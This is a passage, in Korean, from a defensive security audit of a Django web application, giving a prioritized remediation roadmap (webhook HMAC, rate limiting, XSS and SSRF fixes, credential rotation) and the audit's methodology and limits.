## 8. 우선순위 수정 로드맵 (v2 갱신)

### 🔴 P0 — 출시 차단

> **2026-07-06: P0 1~6 코드 조치 완료** (§0.5 표 참조). P0-7만 운영 조치(자격증명 회전) 대기.

1. **IG 웹훅 HMAC enforce 켜기** (C-1) → H-3·H-6·H-7·H-10 동시 해소. ✅ **완료** — `prod.py` 기본 `WEBHOOK_HMAC_ENFORCED=True`(secret 미설정 시 부팅 거부) + `views.py` fail-closed + example 명시.
2. **인증 엔드포인트 레이트리밋 + 잠금** (H-1) — 로그인/회원가입/비번재설정/구글/이메일인증. ✅ **완료** — `ScopedRateThrottle` + `base.py` scope(login 10/min 등). *(잠금(axes)은 후속 권장.)*
3. **`SECRET_KEY` prod 부팅 가드** (H-2) — insecure/placeholder/짧은 키면 부팅 실패. ✅ **완료** — `prod.py` fail-fast.
4. **IG OAuth 콜백 XSS 수정** (H-5, M-8) — `escape()` + `json.dumps`. ✅ **완료** — `_js_embed()` + `escape()`, `str(dict)` 제거.
5. **외부 이미지 재업로드 SSRF 가드** (H-4) — 공용 가드 적용. ✅ **완료** — `apps/core/ssrf.py` + 리다이렉트 hop 재검증.
6. **IG 토큰 평문 로깅 제거** (H-9, M-22) — 예외 마스킹. ✅ **완료** — `raise_for_status_clean` + `scrub_secrets` + 전역 로깅 필터.
7. **`deploy/backups/.env.backup`의 R2/Telegram 자격증명 회전** (Low) — 평문 노출 가정. ⏳ **운영 조치 필요** (코드로 불가 — 각 서비스 콘솔에서 회전).
- ~~PayApp 결제 금액 검증 (M-16)~~ → 🔄 토스 전환으로 소멸(완료 불필요).

### 🟠 P1 — 출시 직후 (2~3주)

- AI/LLM 비용·스로틀 (H-8, M-11, M-12) + 공개 제출/기록 throttle (M-14) ❌
- ~~IG 토큰 평문 로깅~~ → P0로 승격. `apps` 로거 payload 로깅 축소 (M-21) ❌
- ~~Caddy `@external` 라우팅 교정 (M-19)~~ → ✅ 완료
- Access 토큰 수명 단축 (M-2) ❌
- 어드민 권한 분리 + 보안메일 템플릿 게이팅/감사 (M-5, M-6) — M-6 부분 진행 ⚠️
- ~~DM 거버너 wiring + 플랜 한도 강제 (M-13, M-15)~~ → ✅ 완료
- ~~healthz 정보 노출 제거 + Swagger prod 보호~~ → ✅ 완료
- 외부 임포트 fetch 리다이렉트 SSRF (M-7), ai-suggest SSRF (M-10) ❌
- 레퍼럴 validate throttle + 다계정 가입 방지 (M-18) ⚠️

### 🟡 P2 — 중기 (1~2개월)

- **키 관리 정비:** JWT 서명키 / Fernet 암호화키 분리 + `MultiFernet` 회전 (M-3, M-4) ❌
- 의존성 업그레이드 + lockfile + CI 보안 스캐너 (Django/gunicorn/Pillow/DRF, Low) ❌
- 컨테이너 비루트화 + cap_drop (M-20), Redis `requirepass` (Low) ❌
- CSP 헤더 도입 (Info) — XSS 영향 전반 완화 ❌
- R2 민감 자산 비공개 버킷 분리 (Low) ❌
- 공개 페이지 `custom_css`/블록 data 서버 sanitize (M-9, M-24 + AI 생성 CSS) ❌
- 로깅 PII 마스킹·IP HMAC 해시 (Low), requirements dev/prod 분리 (Info) ❌

---

## 9. 부록: 점검 방법론

- **범위:** `apps/` 전체(authentication, workspace, billing, integrations, pages, ai_jobs, admin_api, emails, insights, tiktok, youtube, core) + `config/` 설정 + `deploy/`(Caddy) + `docker-compose.prod.yml` + `Dockerfile` + `requirements.txt`.
- **16개 공격면 차원:** 인증/세션/JWT, 인가/멀티테넌시, 어드민/권한상승, 암호화/시크릿, 웹훅 서명/멱등성, SSRF, 인젝션/XSS, 파일업로드/미디어, DoS/레이트리밋, 설정/배포/헤더, 공개페이지/정보노출, DM 자동화/IG 정책, 결제/구독, AI/LLM, 로깅/PII, 의존성 CVE.
- **검증(v1):** 각 finding은 별도 검증자가 인용된 파일을 직접 다시 읽어 환각/오인용을 색출하고, 배포 토폴로지(Caddy/내부 docker net/출시 범위) 기준으로 severity와 익스플로잇 가능성을 보정. 100건 확정, 5건 오탐 제외.
- **재점검(v2 · 2026-07-06):** 원본 전 항목을 현재 코드에 대해 클러스터별 병렬 재검증. Critical/High가 "해결/전환"으로 판정될 때마다 **적대적 반증**(기본 프로덕션 설정에서 여전히 익스플로잇 가능한지 — off-by-default 플래그·미배선·우회경로 색출)을 수행. 결과 상태를 각 finding에 `↻` 주석으로 병기. 라인번호가 아니라 코드 내용 기준으로 확인(원본 라인번호는 드리프트 가능).
- **한계:** 정적 분석 중심으로 일부 high는 PoC 실행 없이 `likely`로 표기. 의존성 항목은 버전 기반 분석(`confidence: medium`). 실제 `.env.production` 값(키 설정 여부, `WEBHOOK_HMAC_ENFORCED` 실제 설정 여부 등)은 저장소에서 확인 불가 — **운영 시크릿·환경변수 실측 점검은 별도 필요**(특히 C-1의 enforce 플래그는 서버 실값 확인 권장).

---

*본 보고서는 자체 코드베이스에 대한 방어적 보안 점검 결과입니다. v2 재점검 기준 남은 P0(특히 웹훅 HMAC enforce 플래그, 인증 레이트리밋, SECRET_KEY 가드, OAuth XSS, 재업로드 SSRF, 토큰 로깅)를 출시 전 처리하시길 권장합니다.*
